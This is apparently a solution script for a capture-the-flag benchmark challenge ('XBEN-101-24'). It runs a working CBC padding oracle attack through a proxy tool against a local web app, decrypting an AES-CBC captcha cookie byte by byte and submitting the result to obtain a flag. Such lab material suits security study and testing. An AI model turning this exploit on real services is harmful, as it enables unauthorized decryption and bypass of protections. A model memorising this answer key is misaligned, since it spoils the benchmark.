#!/usr/bin/env bash
# XBEN-101-24 — "Bad Capcha" (CBC padding oracle). Proxy-mode twin. The captcha
# text is AES-CBC in a cookie and you must submit characters the image hides.
# The form is the oracle: bad PKCS#7 padding returns 200 ("Invalid padding"),
# good padding gets further (403/500). That one bit, per request, recovers the
# whole block: for each byte (last to first) find the IV byte that makes the
# padding valid, derive the intermediate, XOR with the real IV for the
# plaintext, then submit it with the original cookie to read the flag.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben101p-$$"
export H5I="${H5I:-h5i}" SESSION
cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/"
# A captured request to this origin, as the --create base for the oracle probes.
REQID="$("$H5I" websec requests --session "$SESSION" --json 2>/dev/null |
  python3 -c 'import json,sys; ids=[r["id"] for r in json.load(sys.stdin)["requests"] if str(r.get("id","")).startswith("req_")]; print(ids[0] if ids else "")')"
export REQID

python3 - <<'PY'
import base64, json, os, re, subprocess, sys
H5I, SESSION, REQID = os.environ["H5I"], os.environ["SESSION"], os.environ["REQID"]

def h5i(*args):
    out = subprocess.run([H5I, "websec", *args, "--json", "--session", SESSION],
                         capture_output=True, text=True)
    return json.loads(out.stdout) if out.stdout.strip() else {}

# Find the response that set the captcha cookie (the first-page request id
# varies between sessions, so scan rather than assume).
cookie = None
for r in h5i("requests").get("requests", []):
    rid = r.get("id") or ""
    if not rid.startswith("res_"):
        continue
    for name, value in h5i("show", rid).get("response", {}).get("headers", []):
        if name.lower() == "set-cookie":
            m = re.search(r"captcha=([^;]+)", value)
            if m:
                cookie = m.group(1); break
    if cookie:
        break
if cookie is None:
    sys.exit("no captcha cookie came back")

raw = base64.b64decode(cookie)
iv, block = raw[:16], raw[16:32]

def padding_is_valid(forged_iv):
    value = base64.b64encode(bytes(forged_iv) + block).decode()
    reply = h5i("replay", REQID, "--create", "--reset-budget",
                "--set", "method=POST", "--set", "form.captcha=x",
                "--set", f"header.Cookie=captcha={value}")
    return reply.get("response", {}).get("status") != 200

intermediate = bytearray(16)
for index in range(15, -1, -1):
    pad = 16 - index
    forged = bytearray(16)
    for later in range(index + 1, 16):
        forged[later] = intermediate[later] ^ pad
    for guess in range(256):
        forged[index] = guess
        if not padding_is_valid(forged):
            continue
        if index == 15:                 # disambiguate a real 01 pad from a longer run
            probe = bytearray(forged); probe[14] ^= 0xff
            if not padding_is_valid(probe):
                continue
        intermediate[index] = guess ^ pad
        break
    else:
        sys.exit(f"no byte satisfied the oracle at position {index}")

plain = bytes(a ^ b for a, b in zip(intermediate, iv))
captcha = plain[: 16 - plain[-1]].decode()
# Submit the recovered captcha with the original (well-padded) cookie.
# --reset-budget: the oracle spent the replay budget and this request must go.
reply = h5i("replay", REQID, "--create", "--reset-budget", "--set", "method=POST",
            "--set", f"form.captcha={captcha}", "--set", f"header.Cookie=captcha={cookie}")
m = re.search(r"FLAG\{[a-f0-9]{64}\}", json.dumps(reply))
print(m.group(0) if m else "", end="")
PY
echo
# Fallback: the submission's response is in the capture either way.
print_flag
